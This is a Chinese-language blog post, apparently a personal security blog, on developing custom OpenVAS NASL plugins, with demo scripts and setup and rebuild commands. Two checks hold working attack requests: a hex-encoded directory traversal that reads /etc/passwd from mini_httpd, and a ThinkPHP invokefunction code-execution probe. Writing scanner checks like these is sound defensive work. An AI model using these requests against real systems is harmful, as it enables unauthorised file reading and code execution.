@@ -1,0 +1,204 @@
+<!DOCTYPE html><html lang="zh-Hans"><head><!--[if IE]><style>body{display:none;}</style><script>alert('IE浏览器下无法展示效果，请更换浏览器！');var headNode=document.getElementsByTagName('head')[0];var refresh=document.createElement('meta');refresh.setAttribute('http-equiv','Refresh');refresh.setAttribute('Content','0; url=http://outdatedbrowser.com/');headNode.appendChild(refresh);</script><![endif]--><meta charset="utf-8"><meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no"><meta name="format-detection" content="telephone=no"><meta name="author" content="m01ly"><meta name="description" content="[root@archery-sec9001 supper-user]# openvas-nasl -h Usage:   openvas-nasl [OPTION...] NASL_FILE... - standalone NASL interpreter for OpenVAS  Help Options:   -h, --help                          Show h"><meta property="og:type" content="article"><meta property="og:title" content="openvas-develop"><meta property="og:url" content="https://m01ly.github.io/2021/04/07/openvas-develop/index.html"><meta property="og:site_name" content="Hexo"><meta property="og:description" content="[root@archery-sec9001 supper-user]# openvas-nasl -h Usage:   openvas-nasl [OPTION...] NASL_FILE... - standalone NASL interpreter for OpenVAS  Help Options:   -h, --help                          Show h"><meta property="og:locale"><meta property="og:image" content="https://m01ly.github.io/2021/04/07/openvas-develop/1617788073176.png"><meta property="og:image" content="https://m01ly.github.io/2021/04/07/openvas-develop/1620456185130.png"><meta property="article:published_time" content="2021-04-07T09:33:00.000Z"><meta property="article:modified_time" content="2021-05-24T02:50:41.132Z"><meta property="article:author" content="m01ly"><meta property="article:tag" content="description123456"><meta name="twitter:card" content="summary"><meta name="twitter:image" content="https://m01ly.github.io/2021/04/07/openvas-develop/1617788073176.png"><link rel="apple-touch-icon" href="/apple-touch-icon.png"><link rel="shortcut icon" href="/favicon.ico"><link href="//cdn.bootcss.com/fancybox/3.3.5/jquery.fancybox.min.css" rel="stylesheet"><link rel="stylesheet" href="/css/style.css"><title>openvas-develop | Hexo</title><script src="//cdn.bootcss.com/jquery/3.3.1/jquery.min.js"></script><link href="//cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet"><script src="//cdn.bootcss.com/aos/2.2.0/aos.js"></script><script>var yiliaConfig={fancybox:!0,isHome:!1,isPost:!0,isArchive:!1,isTag:!1,isCategory:!1,fancybox_js:"//cdn.bootcss.com/fancybox/3.3.5/jquery.fancybox.min.js",search:!0}</script><script>yiliaConfig.jquery_ui=[!1]</script><script>yiliaConfig.rootUrl="/"</script><meta name="generator" content="Hexo 5.1.1"><link rel="alternate" href="/atom.xml" title="Hexo" type="application/rss+xml">
+<link rel="stylesheet" href="/css/prism-a11y-dark.css" type="text/css">
+<link rel="stylesheet" href="/css/prism-line-numbers.css" type="text/css"></head><body><div id="container"><div class="left-col"><div class="intrude-less"><header id="header" class="inner"><a href="/" class="profilepic"><img src="/img/avatar.jpg"></a><hgroup><h1 class="header-author"><a href="/">m01ly</a></h1></hgroup><p class="header-subtitle">人生在世，全靠命</p><form id="search-form"><input type="text" id="local-search-input" name="q" placeholder="search..." class="search form-control" autocomplete="off" autocorrect="off" searchonload="false"> <i class="fa fa-times" onclick="resetSearch()"></i></form><div id="local-search-result"></div><p class="no-result">No results found <i class="fa fa-spinner fa-pulse"></i></p><div id="switch-btn" class="switch-btn"><div class="icon"><div class="icon-ctn"><div class="icon-wrap icon-house" data-idx="0"><div class="birdhouse"></div><div class="birdhouse_holes"></div></div><div class="icon-wrap icon-ribbon hide" data-idx="1"><div class="ribbon"></div></div><div class="icon-wrap icon-link hide" data-idx="2"><div class="loopback_l"></div><div class="loopback_r"></div></div><div class="icon-wrap icon-me hide" data-idx="3"><div class="user"></div><div class="shoulder"></div></div></div></div><div class="tips-box hide"><div class="tips-arrow"></div><ul class="tips-inner"><li>菜单</li><li>标签</li><li>友情链接</li><li>目标</li></ul></div></div><div id="switch-area" class="switch-area"><div class="switch-wrap"><section class="switch-part switch-part1"><nav class="header-menu"><ul><li><a href="/">主页</a></li><li><a href="/archives/">所有文章</a></li><li><a href="/tags/">标签云</a></li><li><a href="/about/">简历</a></li></ul></nav><nav class="header-nav"><ul class="social"><a class="fa GitHub" target="_blank" rel="noopener" href="https://github.com/m01ly" title="GitHub"></a> <a class="fa RSS" href="/atom.xml" title="RSS"></a> <a class="fa 网易云音乐" target="_blank" rel="noopener" href="https://music.163.com/" title="网易云音乐"></a></ul><ul class="social"><div class="donateIcon-position"><p style="display:block"><a class="donateIcon" href="javascript:void(0)" onmouseout='var qr=document.getElementById("donate");qr.style.display="none"' onmouseenter='var qr=document.getElementById("donate");qr.style.display="block"'>赏</a></p><div id="donate"><img id="multipay" src="/img/multipay.png" width="250px" alt="m01ly Multipay"><div class="triangle"></div></div></div></ul></nav></section><section class="switch-part switch-part2"><div class="widget tagcloud" id="js-tagcloud"><ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/TLS/" rel="tag">TLS</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/leetcode/" rel="tag">leetcode</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/leetcpde/" rel="tag">leetcpde</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/linux/" rel="tag">linux</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E4%BC%81%E4%B8%9A%E5%AE%89%E5%85%A8%E5%BB%BA%E8%AE%BE/" rel="tag">企业安全建设</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%AE%89%E8%A3%85%E6%95%99%E7%A8%8B/" rel="tag">安装教程</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%AE%B9%E5%99%A8%E6%95%99%E7%A8%8B/" rel="tag">容器教程</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%AF%86%E7%A0%81%E5%AD%A6/" rel="tag">密码学</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%8F%92%E4%BB%B6%E5%BC%80%E5%8F%91/" rel="tag">插件开发</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%97%A5%E5%BF%97%E7%AE%A1%E7%90%86/" rel="tag">日志管理</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/" rel="tag">机器学习</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/" rel="tag">流量分析</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" rel="tag">渗透测试</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F/" rel="tag">漏洞扫描</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%A7%BB%E5%8A%A8%E5%AE%89%E5%85%A8/" rel="tag">移动安全</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E9%9D%B6%E5%9C%BAwriteup/" rel="tag">靶场writeup</a></li></ul></div></section><section class="switch-part switch-part3"><div id="js-friends"><a class="main-nav-link switch-friends-link" target="_blank" rel="noopener" href="https://github.com/TechCatsLab">TechCatsLab</a> <a class="main-nav-link switch-friends-link" target="_blank" rel="noopener" href="https://yangchenglong11.github.io">YangChengLong</a> <a class="main-nav-link switch-friends-link" target="_blank" rel="noopener" href="https://jsharkc.github.io">LiuJiaChang</a> <a class="main-nav-link switch-friends-link" target="_blank" rel="noopener" href="http://blog.yusank.space">YusanKurban</a> <a class="main-nav-link switch-friends-link" target="_blank" rel="noopener" href="https://blog.lizebang.top">Lizebang</a> <a class="main-nav-link switch-friends-link" target="_blank" rel="noopener" href="https://github.com/sunanxiang">SunAnXiang</a> <a class="main-nav-link switch-friends-link" target="_blank" rel="noopener" href="https://github.com/DoubleWoodH">LinHao</a> <a class="main-nav-link switch-friends-link" target="_blank" rel="noopener" href="https://blog.littlechao.top">ShiChao</a> <a class="main-nav-link switch-friends-link" target="_blank" rel="noopener" href="https://github.com/Txiaozhe">TangXiaoJi</a> <a class="main-nav-link switch-friends-link" target="_blank" rel="noopener" href="https://github.com/LLLeon">JiaChenHui</a></div></section><section class="switch-part switch-part4"><div id="js-aboutme">不悲不喜，不卑不亢，努力成为一个更好的程序猿！</div></section></div></div></header></div></div><div class="hide-left-col" title="隐藏侧栏"><i class="fa fa-angle-double-left"></i></div><div class="mid-col"><nav id="mobile-nav"><div class="overlay"><div class="slider-trigger"></div><h1 class="header-author js-mobile-header hide"><a href="/" title="回到主页">m01ly</a></h1></div><div class="intrude-less"><header id="header" class="inner"><a href="/" class="profilepic"><img src="/img/avatar.jpg"></a><hgroup><h1 class="header-author"><a href="/" title="回到主页">m01ly</a></h1></hgroup><p class="header-subtitle">人生在世，全靠命</p><nav class="header-menu"><ul><li><a href="/">主页</a></li><li><a href="/archives/">所有文章</a></li><li><a href="/tags/">标签云</a></li><li><a href="/about/">简历</a></li><div class="clearfix"></div></ul></nav><nav class="header-nav"><ul class="social"><a class="fa GitHub" target="_blank" href="https://github.com/m01ly" title="GitHub"></a> <a class="fa RSS" target="_blank" href="/atom.xml" title="RSS"></a> <a class="fa 网易云音乐" target="_blank" href="https://music.163.com/" title="网易云音乐"></a></ul></nav></header></div><link class="menu-list" tags="标签" friends="友情链接" about="目标"></nav><div class="body-wrap"><article id="post-openvas-develop" class="article article-type-post" itemscope itemprop="blogPost"><div class="article-meta"><a href="/2021/04/07/openvas-develop/" class="article-date"><time class="published" datetime="2021-04-07T09:33:00.000Z" itemprop="datePublished">2021-04-07 发布</time> <time class="updated" datetime="2021-05-24T02:50:41.132Z" itemprop="dateUpdated">2021-05-24 更新</time></a></div><div class="article-inner"><input type="hidden" class="isFancy"><header class="article-header"><h1 class="article-title" itemprop="name">openvas-develop</h1></header><div class="article-info article-info-post"><div class="article-count"><span class="post-count">总字数2.4k</span> <span class="post-count">预计阅读12分钟</span></div><div class="clearfix"></div></div><div class="article-entry" itemprop="articleBody"><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@archery-sec9001 supper-user<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># openvas-nasl -h</span>
+Usage:
+  openvas-nasl <span class="token punctuation">[</span>OPTION<span class="token punctuation">..</span>.<span class="token punctuation">]</span> NASL_FILE<span class="token punctuation">..</span>. - standalone NASL interpreter <span class="token keyword">for</span> OpenVAS
+
+Help Options:
+  -h, --help                          Show <span class="token function">help</span> options
+
+Application Options:
+  -V, --version                       Display version information
+  -d, --debug                         Output debug information to stderr.
+  -D, --description                   Only run the <span class="token string">'description'</span> part of the script
+  -B, --both                          Run <span class="token keyword">in</span> description mode before running the script.
+  -p, --parse                         Only parse the script, don<span class="token string">'t execute it
+  -L, --lint                          '</span>lint<span class="token string">' the script (extended checks)
+  -t, --target=&lt;target>               Execute the scripts against &lt;target>
+  -T, --trace=&lt;file>                  Log actions to &lt;file> (or '</span>-<span class="token string">' for stderr)
+  -c, --config-file=&lt;filename>        Configuration file
+  -e, --source-iface=&lt;iface_name>     Source network interface for established connections.
+  --vendor-version=&lt;string>           Use &lt;string> as vendor version.
+  -s, --safe                          Specifies that the script should be run with '</span>safe checks' enabled
+  -X, --disable-signing               Run the script with disabled signature verification
+  -i, --include-dir<span class="token operator">=</span><span class="token operator">&lt;</span>dir<span class="token operator">></span>             Search <span class="token keyword">for</span> includes <span class="token keyword">in</span> <span class="token operator">&lt;</span>dir<span class="token operator">></span>
+  --debug-tls<span class="token operator">=</span><span class="token operator">&lt;</span>level<span class="token operator">></span>                 Enable TLS debugging at <span class="token operator">&lt;</span>level<span class="token operator">></span>
+  -k, --kb<span class="token operator">=</span><span class="token operator">&lt;</span>key<span class="token operator">=</span>value<span class="token operator">></span>                Set KB key to value. Can be used multiple <span class="token function">times</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>demo.nasl：输出开放的端口</p><pre><code>#
+# Check for ssh
+#
+if(description)
+&#123;
+        script_name(english:&quot;Ensure the presence of ssh&quot;);
+        script_description(english:&quot;This script makes sure that ssh is running&quot;);
+        script_summary(english:&quot;connects on remote tcp port 22&quot;);
+        script_category(ACT_GATHER_INFO);
+        script_family(english:&quot;Administration toolbox&quot;);
+        script_copyright(english:&quot;This script was written by Joe U.&quot;);
+        script_dependencies(&quot;find_service.nes&quot;);
+        exit(0);
+&#125;
+#start = prompt(&quot;First port to scan ? &quot;);
+#end  = prompt(&quot;Last port to scan ? &quot;);
+
+for(i=1;i&lt;9999;i=i+1)
+&#123;
+        soc = open_sock_tcp(i);
+        if(soc)
+        &#123;
+                display(&quot;Port &quot;, i, &quot; is open\n&quot;);
+                close(soc);
+        &#125;
+&#125;</code></pre><h4 id="Tcp请求"><a href="#Tcp请求" class="headerlink" title="Tcp请求"></a>Tcp请求</h4><pre><code>#漏洞检测
+## Variable Initialization
+port = 8080;
+#mini_httpd默认端口
+
+## Check Port status
+if(!get_port_state(port))&#123;
+        #这里经过测试一些未开放的端口返回值都是1，如果开放的话返回值就是10000，所以这里其实就可以根据这个返回值做端口检测
+    display(&quot;ADog:get_port_state failed.&quot;,port,&quot;\n&quot;);
+    exit(0);
+&#125;
+
+## Open the socket
+sock = open_sock_tcp(port);
+if(!sock)&#123;
+        #这里其实跟上面是一样的，sock端口其实都能开放的，所以这段可写可不写
+    display(&quot;ADog:open_sock_tcp failed.&quot;,port,&quot;\n&quot;);
+    exit(0);
+&#125;
+
+## Constructed directory traversal crafted request
+req = raw_string(0x47, 0x45, 0x54, 0x20, 0x2f, 0x65, 0x74, 0x63, 0x2f, 0x70, 0x61, 0x73, 0x73, 0x77, 0x64, 0x20, 0x48, 0x54, 0x54, 0x50, 0x2f, 0x31, 0x2e, 0x31, 0x0d, 0x0a, 0x48, 0x6f, 0x73, 0x74, 0x3a, 0x20, 0x0d, 0x0a, 0x55, 0x73, 0x65, 0x72, 0x2d, 0x41, 0x67, 0x65, 0x6e, 0x74, 0x3a, 0x20, 0x4d, 0x6f, 0x7a, 0x69, 0x6c, 0x6c, 0x61, 0x2f, 0x35, 0x2e, 0x30, 0x20, 0x28, 0x4d, 0x61, 0x63, 0x69, 0x6e, 0x74, 0x6f, 0x73, 0x68, 0x3b, 0x20, 0x49, 0x6e, 0x74, 0x65, 0x6c, 0x20, 0x4d, 0x61, 0x63, 0x20, 0x4f, 0x53, 0x20, 0x58, 0x20, 0x31, 0x30, 0x2e, 0x31, 0x33, 0x3b, 0x20, 0x72, 0x76, 0x3a, 0x36, 0x33, 0x2e, 0x30, 0x29, 0x20, 0x47, 0x65, 0x63, 0x6b, 0x6f, 0x2f, 0x32, 0x30, 0x31, 0x30, 0x30, 0x31, 0x30, 0x31, 0x20, 0x46, 0x69, 0x72, 0x65, 0x66, 0x6f, 0x78, 0x2f, 0x36, 0x33, 0x2e, 0x30, 0x0d, 0x0a, 0x41, 0x63, 0x63, 0x65, 0x70, 0x74, 0x3a, 0x20, 0x74, 0x65, 0x78, 0x74, 0x2f, 0x68, 0x74, 0x6d, 0x6c, 0x2c, 0x61, 0x70, 0x70, 0x6c, 0x69, 0x63, 0x61, 0x74, 0x69, 0x6f, 0x6e, 0x2f, 0x78, 0x68, 0x74, 0x6d, 0x6c, 0x2b, 0x78, 0x6d, 0x6c, 0x2c, 0x61, 0x70, 0x70, 0x6c, 0x69, 0x63, 0x61, 0x74, 0x69, 0x6f, 0x6e, 0x2f, 0x78, 0x6d, 0x6c, 0x3b, 0x71, 0x3d, 0x30, 0x2e, 0x39, 0x2c, 0x2a, 0x2f, 0x2a, 0x3b, 0x71, 0x3d, 0x30, 0x2e, 0x38, 0x0d, 0x0a, 0x41, 0x63, 0x63, 0x65, 0x70, 0x74, 0x2d, 0x4c, 0x61, 0x6e, 0x67, 0x75, 0x61, 0x67, 0x65, 0x3a, 0x20, 0x7a, 0x68, 0x2d, 0x43, 0x4e, 0x2c, 0x7a, 0x68, 0x3b, 0x71, 0x3d, 0x30, 0x2e, 0x38, 0x2c, 0x7a, 0x68, 0x2d, 0x54, 0x57, 0x3b, 0x71, 0x3d, 0x30, 0x2e, 0x37, 0x2c, 0x7a, 0x68, 0x2d, 0x48, 0x4b, 0x3b, 0x71, 0x3d, 0x30, 0x2e, 0x35, 0x2c, 0x65, 0x6e, 0x2d, 0x55, 0x53, 0x3b, 0x71, 0x3d, 0x30, 0x2e, 0x33, 0x2c, 0x65, 0x6e, 0x3b, 0x71, 0x3d, 0x30, 0x2e, 0x32, 0x0d, 0x0a, 0x43, 0x6f, 0x6e, 0x6e, 0x65, 0x63, 0x74, 0x69, 0x6f, 0x6e, 0x3a, 0x20, 0x63, 0x6c, 0x6f, 0x73, 0x65, 0x0d, 0x0a, 0x55, 0x70, 0x67, 0x72, 0x61, 0x64, 0x65, 0x2d, 0x49, 0x6e, 0x73, 0x65, 0x63, 0x75, 0x72, 0x65, 0x2d, 0x52, 0x65, 0x71, 0x75, 0x65, 0x73, 0x74, 0x73, 0x3a, 0x20, 0x31, 0x0d, 0x0a, 0x0d, 0x0a);
+#这里最重要的就是这段poc，由于这是web服务器，因此这的payload，读者可以对这段进行16进制解码，你就会发现其实就是一个web的流量包
+#这里我先使用burp做了漏洞复现，然后将请求包复制下来，将其做了一次16进制转化
+#这里openvas其实自带http的函数，但是这里我仍然使用了socket，原因就是如果后续不是web的服务，那么web相关的函数就用不了，总的来说socket肯定是最通用的方法
+
+## send the attack request and recieve the response
+display(&quot;ADog:port is working.&quot;,port,&quot;\n&quot;);
+
+send(socket:sock, data:req);
+ret = recv(socket:sock, length:1024);
+#获取返回包内容
+close(sock);
+
+#display(&quot;ADog:recv:&quot;,ret);
+
+state = egrep(pattern:&#39;^root.*&#39;,string:ret);
+#openvas自带的匹配函数，这里用于匹配出现root字样，由于这个漏洞是任意文件读取，那么这里我读取的是/etc/passwd，那么就会第一条就会出现root用户的基本信息
+#那么如果出现了，那么就认定此漏洞存在
+#这里的定制化就体现在我们可以针对公司内部漏洞编写nasl脚本，其实仔细看过脚本的人就知道，目前市面上主流的扫描器其实都只是版本匹配，当然这也是为了无损扫描，也有部分payload是真的带poc
+
+if(state)
+&#123;
+  report = &#39;mini_httpd is vulnerable!\n&#39;;
+  security_message(data:report);
+  #这里使用openvas自带的报告函数将漏洞输出到扫描报告里
+  #security_message(port:port);
+  #这两个函数用一个就行了，一开始为了测试使用了这两个，最后报告里也就出现了两次
+  display(&#39;mini_httpd is vulnerable.\n&#39;);
+&#125;</code></pre><p><a target="_blank" rel="noopener" href="http://foreversong.cn/archives/1333">http://foreversong.cn/archives/1333</a></p><h4 id="http请求"><a href="#http请求" class="headerlink" title="http请求"></a>http请求</h4><pre><code># 获取 www 端口，默认为 80
+port = get_http_port(default: 80);
+str = string(&quot;GET /index.php?s=index/think/app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=md5&amp;vars[1][]=Tr0y HTTP/1.0\r\n\r\n&quot;);
+# 发送 payload 并返回服务器的响应
+recv = http_send_recv(port: port, data: str);
+# DEBUG 使用，打印返回的 header+body
+display(recv, &quot;\n&quot;);</code></pre><h4 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h4><p>-X 忽略签名认证</p><p>-t target 目标主机IP/域名</p><p>-i 插件加载目录</p><pre class="line-numbers language-bash"><code class="language-bash">openvas-nasl -i /var/lib/openvas/plugins -Xt 10.27.22.76 demo2.nasl<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/04/07/openvas-develop/1617788073176.png" alt="1617788073176"></p><h4 id="7-测试NASL脚本"><a href="#7-测试NASL脚本" class="headerlink" title="7. 测试NASL脚本"></a>7. 测试NASL脚本</h4><p>将自己写的插件复制到openvas插件库目录：<br>/var/lib/openvas/plugins<br>加载插件:<br>openvassd</p><h4 id="8-重建插件库"><a href="#8-重建插件库" class="headerlink" title="8. 重建插件库"></a>8. 重建插件库</h4><p>openvasmd –rebuild<br>注意：参数“rebuild”代表从一个正在运行的扫描器（openvassd）中重建数据库信息。</p><p>http请求：</p><pre><code>port = get_http_port(default:80);  
+host = http_host_name(port:port);  
+recv = http_get(port:port, item:&quot;/&quot;);  
+display(recv,&quot;\n&quot;);  </code></pre><p>参考：</p><p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/81149159">nasl插件详解</a></p><p><a target="_blank" rel="noopener" href="http://books.gigatux.nl/mirror/networksecuritytools/0596007949/toc.html">nessus的nasl脚本手册</a></p><p><a target="_blank" rel="noopener" href="http://michel.arboi.free.fr/nasl2ref/nasl2_reference.pdf">nasl官方手册</a></p><p><a target="_blank" rel="noopener" href="http://nasl.homemoon.top/index.html">nasl插件开发手册-翻译版</a> 比较全</p><p><a target="_blank" rel="noopener" href="http://nasl.homemoon.top/index.html">Nessus安全测试插件编写教程</a> 入门教程</p><h4 id="识别nginx的插件"><a href="#识别nginx的插件" class="headerlink" title="识别nginx的插件"></a>识别nginx的插件</h4><p>插件脚本：</p><pre><code>###############################################################################
+# OpenVAS Vulnerability Test
+#
+# Nginx version page
+#
+# Authors:
+# molly.zhang &lt;molly.zhang@alussinan.org&gt;
+#
+# Copyright:
+# Copyright (C) 2021 molly zhang
+#
+# This program is free software; you can redistribute it and/or modify
+# it under the terms of the GNU General Public License version 2,
+# as published by the Free Software Foundation
+#
+# This program is distributed in the hope that it will be useful,
+# but WITHOUT ANY WARRANTY; without even the implied warranty of
+# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+# GNU General Public License for more details.
+#
+# You should have received a copy of the GNU General Public License
+# along with this program; if not, write to the Free Software
+# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
+###############################################################################
+if(description)
+&#123;
+  script_oid(&quot;1.3.6.1.4.1.56487.1.0.75984&quot;);
+  script_version(&quot;2021-04-24T15:18:35+0000&quot;);
+  script_tag(name:&quot;last_modification&quot;, value:&quot;2021-05-08 15:18:35 +0000 (Sat, 08 May 2021)&quot;);
+  script_tag(name:&quot;creation_date&quot;, value:&quot;2021-05-08 14:08:04 +0100 (Sat, 08 May 2021)&quot;);
+  script_tag(name:&quot;cvss_base_vector&quot;, value:&quot;AV:N/AC:L/Au:N/C:N/I:N/A:N&quot;);
+  script_tag(name:&quot;cvss_base&quot;, value:&quot;5.3&quot;);
+  script_name(&quot;Nginx version&quot;);
+  script_category(ACT_GATHER_INFO);
+  script_copyright(&quot;Copyright (C)：mengli.zhang in 20210507&quot;);
+  script_family(&quot;MyNVTS&quot;);
+  script_dependencies(&quot;find_service.nasl&quot;, &quot;httpver.nasl&quot;, &quot;global_settings.nasl&quot;);
+  script_require_ports(&quot;Services/www&quot;, 80);
+  script_exclude_keys(&quot;Settings/disable_cgi_scanning&quot;);
+  script_add_preference(name:&quot;Show full HTTP headers in output&quot;, type:&quot;checkbox&quot;, value:&quot;no&quot;, id:1);
+  script_tag(name:&quot;summary&quot;, value:&quot;This script detects and reports the Nginx&#39;s Version.&quot;);
+  script_tag(name:&quot;qod_type&quot;, value:&quot;remote_banner&quot;);
+  exit(0);
+&#125;
+display(&quot;Hello World .\n&quot;);
+display(&quot;Hello World openvas-nasl. \n&quot;);
+
+include(&#39;/var/lib/openvas/plugins/http_func.inc&#39;);
+include(&#39;/var/lib/openvas/plugins/global_settings.inc&#39;);
+#display(default:80,&quot;\n&quot;);
+#port = get_http_port(default:80);
+#host = http_host_name(port:port);
+display(&quot;start#########\n&quot;);
+#display(host,&quot;\n&quot;);
+
+#recv = http_send_recv(port: port, data: str);
+#str = string(&quot;GET /index.php HTTP/1.0\r\n\r\n&quot;);
+str = string(&quot;GET / HTTP/1.0\r\n\r\n&quot;);
+recv = http_send_recv(port: &quot;80&quot;,data:str);
+
+display(recv, &quot;\n&quot;);
+state = egrep(pattern:&#39;nginx.*&#39;,string:recv);
+display(&quot;state:&quot;,state);
+if(state)
+&#123;
+  display(&#39;nginx version xielou\n&#39;);
+&#125;
+exit( 0 );</code></pre><p>openvasmd –rebuild –progress</p><p>测试：</p><pre><code>openvas-nasl -Xt 10.27.22.76 nginx_version.nasl</code></pre><pre><code>docker exec -it 337e5d6c9854 bash
+cd /usr/local/var/lib/openvas/plugins
+vim nginx_version.nasl
+cat nginx_version.nasl
+openvas-nasl -Xt 10.27.22.76 nginx_version.nasl</code></pre><p>[root@archery-sec9002 supper-user]# docker restart 337e5d6c9854</p><p>重启openvas</p><pre><code>#加载插件
+openvassd
+
+#### 8. 重建插件库
+
+openvasmd –rebuild#失败　　这一步成功会在/usr/local/var/cache/openvas 中生成.nvti 文件
+
+因为openvasmd，gvmd自GVM-10起，它已重命名为：gvmd，并且openvas-check-setup已弃用且无用。
+
+
+gvmd --rebuild-scap=ovaldefs
+docker restart 337e5d6c9854
+</code></pre><p>sudo service openvas-manager restart;</p><p>sudo service openvas-scanner restart;</p><p>sudo openvasmd –rebuild –progress</p><p>family=”Web application abuses”</p><p>family=”MyNVTs”</p><p>family=”Policy”</p><p>greenbone-nvt-sync –rsync #greenbone-nvt-sync –curl<br>greenbone-scapdata-sync –rsync</p><p>greenbone-certdata-sync –rsync</p><p>查看日志：</p><p>cat /usr/local/var/log/gvm/openvassd.log</p><p>cat /usr/local/var/log/gvm/gvmd.log</p><p>docker查看日志</p><p>[root@archery-sec9002 supper-user]# docker logs openvas0127</p><p>可以通过运行以下命令来查看/ var / log / gvm / *中的所有日志：</p><pre><code>docker logs openvas</code></pre><p><img src="/2021/04/07/openvas-develop/1620456185130.png" alt="1620456185130"></p><pre><code>md   main:MESSAGE:2021-05-08 03h28.04 utc:32273:    Greenbone Vulnerability Manager version 8.0.2 (DB revision 205)
+md   main:WARNING:2021-05-08 03h28.04 utc:32273: main: Main process is already running
+md   main:MESSAGE:2021-05-08 03h29.24 utc:32318:    Greenbone Vulnerability Manager version 8.0.2 (DB revision 205)
+md manage:   INFO:2021-05-08 03h29.24 utc:32318:    Rebuilding SCAP data (ovaldefs).
+md manage:WARNING:2021-05-08 03h29.26 utc:32318: sql_prepare_internal: sqlite3_prepare failed: no such column: id
+md manage:WARNING:2021-05-08 03h29.26 utc:32318: sqlv: sql_prepare_internal failed
+md   main:MESSAGE:2021-05-08 03h32.42 utc:15:    Greenbone Vulnerability Manager version 8.0.2 (DB revision 205)
+md   main:   INFO:2021-05-08 03h32.42 utc:15:    Migrating database.
+md   main:WARNING:2021-05-08 03h32.42 utc:15: main: databases are already at the supported version
+md   main:MESSAGE:2021-05-08 03h32.42 utc:17:    Greenbone Vulnerability Manager version 8.0.2 (DB revision 205)
+md manage:   INFO:2021-05-08 03h32.42 utc:17:    Getting users.
+md   main:MESSAGE:2021-05-08 03h33.48 utc:26:    Greenbone Vulnerability Manager version 8.0.2 (DB revision 205)
+util gpgme:MESSAGE:2021-05-08 03h33.48 utc:27: Setting GnuPG dir to &#39;/usr/local/var/lib/gv</code></pre><p>greenbone-nvt-sync –help</p><p>greenbone-nvt-sync –refresh</p><p>gvmd -h</p><p>openvassd -h</p><link href="//src.wangriyu.wang/lib/Aplayer/APlayer.min.css" rel="stylesheet"><script src="//src.wangriyu.wang/lib/Aplayer/APlayer.min.js"></script><div id="aplayer"></div><script src="/js/player.js"></script></div></div><div class="copyright"><p><span>本文标题:</span><a href="/2021/04/07/openvas-develop/">openvas-develop</a></p><p><span>文章作者:</span><a href="/" title="回到主页">m01ly</a></p><p><span>发布时间:</span>2021-04-07, 17:33:00</p><p><span>最后更新:</span>2021-05-24, 10:50:41</p><p><span>原始链接:</span><a class="post-url" href="/2021/04/07/openvas-develop/" title="openvas-develop">https://m01ly.github.io/2021/04/07/openvas-develop/</a></p><p><span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license noopener" target="_blank" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target="_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。</p></div><nav id="article-nav"><div id="article-nav-newer" class="article-nav-title"><a href="/2021/04/26/machine-learning-classify-knn/">machine-learning-classify-knn</a></div><div id="article-nav-older" class="article-nav-title"><a href="/2021/04/06/leetcode-daily/">leetcode-daily</a></div></nav></article><div id="toc" class="toc-article"><strong class="toc-title">文章目录</strong><ol class="toc"><li class="toc-item toc-level-4"><a class="toc-link" href="#Tcp%E8%AF%B7%E6%B1%82"><span class="toc-text">Tcp请求</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#http%E8%AF%B7%E6%B1%82"><span class="toc-text">http请求</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BC%96%E8%AF%91"><span class="toc-text">编译</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#7-%E6%B5%8B%E8%AF%95NASL%E8%84%9A%E6%9C%AC"><span class="toc-text">7. 测试NASL脚本</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#8-%E9%87%8D%E5%BB%BA%E6%8F%92%E4%BB%B6%E5%BA%93"><span class="toc-text">8. 重建插件库</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%AF%86%E5%88%ABnginx%E7%9A%84%E6%8F%92%E4%BB%B6"><span class="toc-text">识别nginx的插件</span></a></li></ol></div><style>.left-col .switch-area,.left-col .switch-btn{display:none}.toc-level-6 i,.toc-level-6 ol{display:none!important}</style><input type="button" id="tocButton" value="隐藏目录" 